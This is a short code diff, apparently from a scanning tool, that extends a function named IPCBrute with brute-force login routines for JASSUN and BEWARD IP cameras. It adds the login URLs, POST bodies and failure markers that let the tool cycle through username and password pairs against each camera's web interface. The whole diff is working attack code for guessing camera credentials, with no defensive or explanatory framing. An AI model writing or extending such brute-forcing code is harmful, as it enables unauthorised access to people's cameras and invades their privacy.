@@ -70,12 +70,20 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("Not logged in");
 	}
+	else if (strcmp(SPEC, "JASSUN") == 0)
+	{
+		negVector.push_back("Log in failed");
+	}
+	else if (strcmp(SPEC, "BEWARD") == 0)
+	{
+		negVector.push_back("/error.asp");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
         return lps;
     };
-
+	
 	int res = 0;
     for(int i = 0; i < MaxLogin; ++i)
     {
@@ -154,7 +162,18 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 				sprintf(request, "%s:%d/login.html", ip, port);
 				sprintf(postData, "username=%s&password=%s&Redir=/", login, pass);
 			}
-
+			else if (strcmp(SPEC, "JASSUN") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s:%d/Login.htm", ip, port);
+				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
+			}
+			else if (strcmp(SPEC, "BEWARD") == 0)
+			{
+				sprintf(request, "%s:%d/webs/httplogin?username=%s&password=%s&UserID=45637757",
+					ip, port, login, pass);
+			}
+			
             std::string buffer;
             if(doPost) res = Connector::nConnect(request, port, &buffer, postData); 
 			else res = Connector::nConnect(request, port, &buffer);
